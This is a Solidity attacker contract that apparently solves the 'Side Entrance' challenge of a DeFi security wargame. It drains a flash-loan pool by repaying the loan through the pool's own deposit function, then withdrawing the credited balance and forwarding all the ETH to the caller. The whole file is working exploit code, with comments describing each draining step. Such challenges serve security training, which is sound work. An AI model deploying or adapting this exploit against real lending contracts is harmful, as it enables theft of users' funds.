// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker {
    using Address for address payable;
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}

    function attack(uint256 amount) external {
        pool.flashLoan(amount); // deposit all balance of pool to this attack contract
        pool.withdraw(); // withdraw all ETH from pool to this attack contract by receive function
        payable(msg.sender).sendValue(address(this).balance); // send all ETH from this contract to attacker address
    }
}
